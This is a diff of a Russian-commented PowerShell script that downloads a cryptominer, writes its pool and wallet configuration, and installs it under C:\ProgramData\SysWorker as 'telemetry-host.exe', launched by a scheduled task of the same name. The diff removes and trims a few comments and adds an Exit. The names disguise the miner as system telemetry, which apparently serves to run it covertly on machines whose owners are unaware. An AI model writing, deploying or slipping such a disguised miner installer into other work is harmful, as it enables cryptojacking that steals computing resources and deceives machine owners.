@@ -1,9 +1,8 @@
 # === НАСТРОЙКИ ===
 $Coin = "USDT"
 $Wallet = "0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
-$RefCode = ""                          # Опционально: реф-код unMineable (снижает комиссию с 1% до 0.75%)
 $Pool = "rx.unmineable.com:3333"
-$MaxCpuUsage = 60                      # Процент потоков CPU (можно поменять под конкретную машину)
+$MaxCpuUsage = 60                      # % CPU
 $InstallDir = "C:\ProgramData\SysWorker"
 $TaskName = "telemetry-host"
 $ExeFileName = "telemetry-host.exe"
@@ -49,7 +48,6 @@ if (-not $ExtractedExe) {
 Move-Item -Path $ExtractedExe.FullName -Destination $TargetExePath -Force
 Remove-Item -Path $TmpDir, $ZipPath -Recurse -Force
 
-# 4. Генерируем config.json в UTF-8 СТРОГО БЕЗ BOM
 $UserString = "$Coin`:$Wallet.$WorkerName"
 if ($RefCode -ne "") {
     $UserString = "$UserString#$RefCode"
@@ -94,3 +92,4 @@ Start-Sleep -Seconds 3
 Write-Host "Готово. Воркер $WorkerName запущен через задачу $TaskName." -ForegroundColor Green
 Get-Process -Name "telemetry-host" -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CPU
 Get-ScheduledTask -TaskName $TaskName | Get-ScheduledTaskInfo
+Exit
